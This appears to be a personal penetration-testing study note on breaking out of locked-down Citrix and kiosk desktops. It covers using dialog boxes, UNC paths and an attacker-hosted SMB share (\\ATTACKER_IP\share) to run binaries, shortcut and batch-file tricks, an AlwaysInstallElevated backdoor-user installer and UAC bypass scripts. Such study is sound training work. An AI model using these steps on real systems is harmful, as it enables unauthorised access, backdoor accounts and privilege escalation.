
2026-05-26 14:35

Tags: #escalation 

## Citrix Breakout

- **Virtualization** platforms (Citrix, Kiosk, AWS AppStream, etc.) are often heavily locked down via group policies to prevent users from accessing standard system utilities like `cmd.exe`, PowerShell, or the `C:\` drive. Getting a command prompt in these environments is a critical milestone that grants significant control over the OS and enables privilege escalation.


## The Core Methodology

- The basic workflow for escaping a restricted desktop environment boils down to three primary steps:
	1. **Gain access** to a Windows Dialog Box.
	    
	2. **Exploit the Dialog Box** to achieve command execution.
	    
	3. **Escalate privileges** to gain higher levels of system access.


## Initial Access & Path Bypasses

- When standard File Explorer navigation is blocked by group policy, attackers leverage applications that interact with the local filesystem (e.g., Paint, Notepad, Wordpad).
	- ![[Pasted image 20260526144004.png]]


- **Windows Dialog Boxes & UNC Paths:** Features like _Save As_, _Open_, or _Export_ trigger a standard Windows Dialog Box. By entering a [**Local UNC path**](https://learn.microsoft.com/en-us/dotnet/standard/io/file-path-formats#unc-paths) (e.g., `\\127.0.0.1\c$\users\pmorgan`) into the "File name" field, you can completely bypass File Explorer restrictions and access local directories.
	- ![[Pasted image 20260526144014.png]]
	- ![[Pasted image 20260526144030.png]]


- **Remote SMB Shares:** You can host malicious files or custom binaries on an attacker machine using Impacket's `smbserver.py`. By entering the remote UNC path (e.g., `\\ATTACKER_IP\share`) into the Dialog Box, you can browse your remote tools. Executing a custom binary (like a simple C program that calls `system("cmd.exe")`) from this share bypasses the inability to copy/paste files directly.
	- ![[Pasted image 20260526144052.png]]
	- ![[Pasted image 20260526144545.png]]
	- ![[Pasted image 20260526144627.png]]
	- ![[Pasted image 20260526144600.png]]


- **Modifying Shortcuts (`.lnk`):** If you have access to existing desktop shortcuts, you can edit the **Target** field in the shortcut's Properties to point to a command shell or a malicious script.
	- ![[Pasted image 20260526144656.png]]
	- ![[Pasted image 20260526144704.png]]
	- ![[Pasted image 20260526144708.png]]
	- 


- **Script Execution:** Creating and running simple scripts (e.g., an `evil.bat` file simply containing the word `cmd`) leverages default file interpreters to spawn an interactive console.
	- ![[Pasted image 20260526144734.png]]

## Bypassing Blocked Utilities

|**Tool Category**|**Default Windows Tool (Blocked)**|**Effective Alternatives**|**Advantage**|
|---|---|---|---|
|**File Management**|File Explorer|Explorer++, Q-Dir|Fast, portable, bypasses folder restrictions to copy/move files.|
|**Registry Editing**|`regedit.exe`|Simpleregedit, Uberregedit|Allows GUI-based interaction with the registry despite GPO blocks.|


## Post-Breakout: Escalation & UAC

- With a basic shell, you can deploy enumeration scripts like **WinPEAS** or **PowerUp** to hunt for misconfigurations.

- **Example Vector: AlwaysInstallElevated** If registry queries reveal that `AlwaysInstallElevated` is set to `0x1`, the system allows standard users to install `.msi` files with SYSTEM privileges. Using PowerUp's `Write-UserAddMSI` function, you can generate a malicious installer that creates a new backdoor user and adds them directly to the local Administrators group.


- Simply adding a user to the Administrators group does not grant immediate access to protected directories (like `C:\Users\Administrator`). Windows User Account Control (UAC) acts as a barrier, stripping administrative tokens from standard interactive processes.

- **The Fix:** You must utilize UAC bypass scripts (such as `Bypass-UAC.ps1` using methods like `UacMethodSysprep`) to circumvent the mechanism. This will spawn a new, fully elevated PowerShell session, confirming your administrative rights and granting total access to the system.
## References:

